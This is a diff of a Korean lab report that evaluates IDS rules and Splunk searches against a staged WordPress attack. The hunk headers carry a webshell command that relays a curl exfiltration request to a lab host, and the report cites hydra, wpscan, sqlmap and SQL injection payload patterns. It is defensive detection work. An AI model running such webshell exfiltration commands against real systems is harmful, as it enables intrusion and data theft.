@@ -239,7 +239,7 @@ curl -s 'http://10.0.0.254:8080/?cmd=curl+http://10.50.50.30:8888/exfil+-d+test+
 | 1000004 | PHTML WAF Bypass | 지속성 | ❌ **미탐지** — .phtml 업로드 대신 기존 hello.php 직접 편집 |
 | 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | ❌ **미탐지** — WordPress→MySQL 3306 정상 통신만 발생 (3306 제외 룰) |
 | 1000006 | DMZ→Mng Access | 내부 정찰 | ❌ **미탐지** — 관리망(10.0.50.0/24) 접근 시도 없음 |
-| 1000007 | Webshell Output | 지속성 | ✅ **탐지** — `id` 명령 응답에 uid=/gid= 포함 (Splunk 건수 확인 필요) |
+| 1000007 | Webshell Output | 지속성 | ✅ **탐지 (17건)** — `id` 명령 응답에 uid=/gid= 포함 |
 | 1000008 | WP File Manager CVE | 초기 침투 | ❌ **미탐지** — connector.minimal.php 직접 접근 대신 WP 관리자 UI 경유 |
 | 1000009 | WPScan Detection | 정찰 | ✅ **1,978 이벤트** — wpscan User-Agent 탐지 |
 
@@ -249,6 +249,9 @@ curl -s 'http://10.0.0.254:8080/?cmd=curl+http://10.50.50.30:8888/exfil+-d+test+
 > **핵심 발견:** 9개 룰 중 **4개(1000001, 1000002, 1000007, 1000009)만 탐지**, 5개 미탐지.  
 > 원인: 설계 시 가정한 공격 경로(CVE-2020-25213 직접 익스플로잇)와 실제 공격 경로(관리자 인증 → 플러그인 편집)가 달랐음.  
 > 이는 **시그니처 기반 IDS의 근본적 한계** — 동일 목표를 다른 경로로 달성하면 탐지 실패.
+>
+> **참고:** Splunk 경보에서 웹쉘 탐지가 SID 1000006으로 기록됨 (Git local.rules의 SID 1000007과 다름).
+> pfSense 배포 시 룰 순서/SID가 재배치된 것으로 추정. 실제 탐지 내용(Webshell 관련)은 동일.
 
 ---
 
@@ -498,7 +501,7 @@ index=pfsense "WPScan Scanner Detected"
 | 1000004 | PHTML WAF Bypass | 지속성 | ❌ 미탐지 | 0건 | .phtml 업로드 자체 미발생 |
 | 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | ❌ 미탐지 | 0건 | 허용 포트(3306)만 이용 |
 | 1000006 | DMZ→Mng Access | 내부 정찰 | ❌ 미탐지 | 0건 | 관리망 접근 시도 없음 |
-| 1000007 | Webshell Output | 지속성 | ✅ 탐지 | 확인 필요 | — |
+| 1000007 | Webshell Output | 지속성 | ✅ 탐지 | 17건 | — |
 | 1000008 | WP File Manager CVE | 초기 침투 | ❌ 미탐지 | 0건 | admin-ajax.php 경유, URI 불일치 |
 | 1000009 | WPScan Detection | 정찰 | ✅ 탐지 | 1,978건 | — |
 
@@ -576,10 +579,10 @@ OR (index=pfsense "[LOCAL] WordPress Login Brute Force")
 
 ```spl
 index=idx_web sourcetype="apache:access"
-  (uri="*.phtml" OR uri="*/uploads/*.php" OR uri="*/uploads/*.phtml")
+  (uri="*cmd=*" OR uri="*/uploads/*.php" OR uri="*/uploads/*.phtml")
 | eval phase=case(
-    method="POST", "업로드 시도",
-    method="GET" AND match(uri,"cmd="), "명령 실행",
+    method="POST" AND match(uri,"uploads"), "업로드 시도",
+    match(uri,"cmd="), "명령 실행",
     true(), "접근")
 | stats count values(uri) as uri_list by clientip, phase
 | sort -count
@@ -746,7 +749,7 @@ index=idx_web sourcetype="apache:access" uri="/wp-login.php" method="POST"
 | 1000009 | WPScan Scanner Detected | 1,978 | **정탐** | wpscan UA `WPScan v3.x`가 모든 요청 헤더에 포함. 공격 도구 확정. |
 | 1000001 | WP Login Brute Force | 1,978 | **정탐** | hydra가 30초간 13회 POST 시도 (threshold 5회/분 초과). Apache access.log와 시각 일치. |
 | 1000002 | XML-RPC Brute Force | 8 | **정탐** | wpscan 정찰 중 xmlrpc.php 접근. `wp.getUsersBlogs` body 패턴 확인. |
-| 1000007 | Webshell Command Output | 확인 필요 | **정탐** | `/?cmd=id` 응답에 `uid=33(www-data) gid=33(www-data)` 포함. 웹쉘 실행 확정. |
+| 1000007 | Webshell Command Output | 17건 | **정탐** | `/?cmd=id` 응답에 `uid=33(www-data) gid=33(www-data)` 포함. 웹쉘 실행 확정. |
 | - | ET WEB_SERVER SQL Injection | 18 | **정탐** | sqlmap UA + SQL 페이로드(`UNION SELECT`, `OR 1=1`). 자동화 도구 확정. |
 
 ### 미탐지 공격의 분석 (False Negative)
